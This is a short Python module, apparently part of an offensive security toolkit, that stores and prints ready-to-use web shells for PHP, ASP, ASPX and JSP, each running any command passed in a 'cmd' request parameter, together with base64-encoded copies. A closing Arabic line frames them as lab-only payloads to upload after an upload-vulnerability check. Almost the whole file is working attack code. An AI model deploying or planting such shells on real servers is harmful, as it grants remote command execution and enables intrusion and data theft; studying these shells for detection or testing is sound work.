# webshell.py — توليد صدفات ويب للاختبار
import base64
from core.registry import module

WEBSHELLS = {
 "php_simple": "<?php system($_GET['cmd']); ?>",
 "php_full": "<?php if(isset($_REQUEST['cmd'])){echo '<pre>';system($_REQUEST['cmd']);echo '</pre>';} ?>",
 "asp": "<% Execute(Request(\"cmd\")) %>",
 "aspx": "<%@ Page Language=\"C#\" %><%Response.Write(System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"cmd\"]).StandardOutput.ReadToEnd());%>",
 "jsp": "<% if(request.getParameter(\"cmd\")!=null){out.println(java.io.File.separator);java.util.Scanner s=new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream()).useDelimiter(\"\\\\A\");out.println(s.hasNext()?s.next():\"\");} %>",
}

@module("webshell", "payload", "توليد صدفات ويب للاختبار")
def run(base, a, R):
    for name, code in WEBSHELLS.items():
        b64 = base64.b64encode(code.encode()).decode()
        R.info(f"  [{name}]")
        R.info(f"      {code}")
        R.info(f"      base64: {b64[:60]}...")
    R.info("للرفع بعد فحص وحدة upload — اختبار فقط في مختبرك")
